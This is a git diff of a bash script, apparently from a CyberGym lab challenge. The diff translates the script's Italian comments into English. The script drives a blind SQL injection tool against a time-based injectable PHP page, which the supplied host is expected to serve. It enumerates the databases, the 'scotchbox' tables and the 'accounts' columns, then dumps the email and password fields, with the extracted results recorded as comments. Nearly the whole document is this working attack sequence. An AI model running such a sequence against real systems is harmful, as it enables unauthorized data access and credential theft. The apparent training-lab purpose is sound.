@@ -1,34 +1,35 @@
 #!/bin/bash
 
 if [ "$1" == '' ]; then
-	echo "Non è stato passato l'indirizzo IP o l'hostname della macchina ospitante il programma CyberGym";
-	echo "Per favore passarlo come primo ed unico parametro";
+	echo "The IP address or hostname of the host machine of the CyberGym program has not been passed";
+	echo "Please pass it as the first and only parameter";
 	exit;
 fi
 
-# NB: Il parametro -m serve per non far stampare i dati recuperati durante l'esecuzione (che vengono messi per comodità
-# in un commento successivo alla chiamata nel presente script) per evitare che l'output risulti troppo verboso e/o confusionario
+# NB: The -m parameter is used to not print the data recovered during execution (which are put for convenience
+# in a comment following the call in this script) to prevent the output from being too verbose and / or confusing
 
-# Recupero i databases
+# Retrieving the databases
 ./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --databases -m
-# Estratti i database
+# The extracted databases are
 # information_schema
 # mysql
 # performance_schema
 # scotchbox <--
-# Recupero le tabelle da scotchbox
+# Retrieving tables from scotchbox
 ./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --tables -m
-#Estratte le tabelle
+# The extracted tables are
 # accounts <--
 # datacapture
 # messages
-# Recupero i nomi delle colonne
+# Retrieving the names of the columns fron table accounts
 ./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --table=accounts --columns -m
-# Estratte le clonne
-# id:int
-# first_name:varchar
-# last_name:varchar
-# email:varchar
-# password:varchar
-# Recupero i dati di login
+# The names of the extracted columns are
+# id: int
+# first_name: varchar
+# last_name: varchar
+# email: varchar
+# password: varchar
+# Retrieving login data
 ./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --table=accounts --column-list=email,password
+# See Challenge2.md for results
